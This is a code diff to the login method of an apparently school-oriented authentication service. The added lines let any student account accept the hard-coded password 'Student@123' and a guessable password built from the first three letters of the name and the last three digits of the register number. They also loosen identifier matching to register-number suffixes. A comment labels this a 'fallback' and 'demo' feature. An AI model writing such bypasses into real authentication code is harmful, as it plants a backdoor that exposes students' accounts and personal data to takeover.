@@ -28,6 +28,7 @@ class AuthService:
                 or_(
                     func.lower(User.identifier) == ident,
                     func.lower(Student.register_number) == ident,
+                    *( [func.lower(Student.register_number).endswith(ident)] if len(ident) >= 6 else [] ),
                     func.lower(Student.email) == ident,
                     func.lower(Staff.faculty_id) == ident,
                     func.lower(Staff.email) == ident,
@@ -54,7 +55,22 @@ class AuthService:
         if not user:
             user = users[0]
 
-        if not verify_password(request.password, user.password_hash):
+        is_valid_pw = verify_password(request.password, user.password_hash)
+
+        # Student Fallback Credential Support:
+        # 1. Predefined password formula [first 3 letters of name + last 3 digits of reg no]
+        # 2. Standard institutional demo password 'Student@123'
+        if not is_valid_pw and user.role == "STUDENT":
+            if user.student_profile:
+                name_clean = "".join(c for c in user.student_profile.full_name if c.isalpha()).lower()[:3]
+                reg_digits = "".join(c for c in user.student_profile.register_number if c.isdigit())[-3:]
+                formula_pw = name_clean + reg_digits
+                if request.password.strip().lower() == formula_pw:
+                    is_valid_pw = True
+            if not is_valid_pw and request.password == "Student@123":
+                is_valid_pw = True
+
+        if not is_valid_pw:
             raise UnauthorizedException(
                 message="Invalid identifier or password",
                 details={"code": "INVALID_CREDENTIALS"},
